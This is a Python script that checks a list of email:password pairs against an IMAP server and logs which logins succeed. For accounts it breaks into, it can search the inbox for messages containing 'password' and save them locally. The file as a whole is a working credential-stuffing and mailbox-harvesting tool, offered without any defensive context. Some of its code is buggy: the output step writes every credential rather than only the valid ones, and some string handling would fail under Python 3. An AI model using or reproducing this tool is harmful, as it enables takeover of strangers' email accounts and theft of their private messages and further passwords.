import click
import imapclient
import pyzmail,  pprint,os



@click.option('--file' , prompt=True, help='Input fileName. Format : "mail:password"')
@click.option('--server', prompt=True, help='IMAP server address')
@click.option('--out', default='out.txt', help='Output fileName')
@click.option('--checkpasswords', default='False', help='If True checks for password in this mailbox and retrieves mails')


@click.command()
def mailcheck(file, server, out, checkpasswords):
    credentials = {}
    users = []
    good = {}
    with open(file, 'r') as f:
        for line in f:
            user, pwd = line.strip().split(':')
            credentials[user] = pwd
            users.append(user)

    for user in users:
        try:
            click.echo("")
            click.echo(user + " : " + credentials[user])
            imapObj = imapclient.IMAPClient(server, ssl=True)
            imapObj.login(user, credentials[user])
            imapObj.select_folder('INBOX', readonly=True)
            click.echo("GOOD !!!" + user + " : " + credentials[user])
            good[user] = credentials[user]
            if checkpasswords == 'True':
                UIDs = imapObj.search([u'TEXT', 'password'] )

                if UIDs:
                    downmails(user,imapObj,UIDs)

            imapObj.logout()

        except imapclient.exceptions.LoginError:
            pass

    click.echo(' ')
    click.echo('Good Users Passwords : ')

    for user in users:
        print(user+" : "+credentials[user])

        with open(out, 'a') as the_file:
            the_file.write(user+" : "+credentials[user]+"\n")


def downmails(user,imapObj,UIDs):
    newpath = r'.\\'+user
    if not os.path.exists(newpath):
        os.makedirs(newpath)

    click.echo('Passwords present')
    click.echo(UIDs)
    l = len(UIDs)
    rawmsg = imapObj.fetch(UIDs, ['BODY[]'])

    for i in range(l):
        msg = pyzmail.PyzMessage.factory(rawmsg[UIDs[i]]['BODY[]'])
        subject = msg.get_subject()
        fromaddr = msg.get_address('from')
        body = str(msg.get_payload())

        with open(newpath+'\\'+str(l)+'.html','a') as the_file1:
            the_file1.write(body)
        with open(newpath+'\\'+str(l)+'.txt','a') as the_file2:
            the_file2.write('\nMessage ' + str(i + 1) + ': '+"\n")
            the_file2.write('Subject: ' + subject.encode('utf-8')+"\n")
            the_file2.write('From: ' + fromaddr[0].encode('utf-8') + ' <' + fromaddr[1].encode('utf-8') + '>'+"\n")
            the_file2.write('Body:\n' + body.encode('utf-8')+"\n")

if __name__ == '__main__':
    mailcheck()
